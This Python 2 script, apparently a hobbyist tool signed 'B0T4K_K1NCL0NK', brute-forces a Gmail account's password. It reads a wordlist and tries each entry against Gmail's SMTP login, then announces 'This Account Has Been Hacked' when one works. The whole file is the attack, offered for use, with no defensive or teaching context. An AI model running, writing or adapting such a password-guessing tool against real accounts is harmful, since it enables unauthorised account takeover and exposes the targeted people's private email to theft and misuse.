#!/usr/bin/python
'''b0t4k_k1ncl0nk is nub'''

import smtplib
from os import system

def main():
   print '================================================='
   print '#          create by B0T4K_K1NCL0NK             #'
   print '================================================='
   print '#   +    +  ++++  +     +     +++++  +       +  #'
   print '#   +    +  +     +     +     +   +  +       +  #'
   print '#   +    +  +     +     +     +   + : +     +   #'
   print '#   ++++++  ++++  +     +     +   + :  +   +    #'
   print '#   +    +  +     +     +     +   + :   + +     #'
   print '#   +    +  ++++  ++++  ++++  +++++      +      #'
   print '================================================='


main()
print ' \n \n[1] Enter e-mail target (gmail account)'
print ' \n \n[2] Exit                '
option = input('\n\nSelect One!!==>')
if option == 1:
   file_path = raw_input('path of passwords file (example : passlist.txt) :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
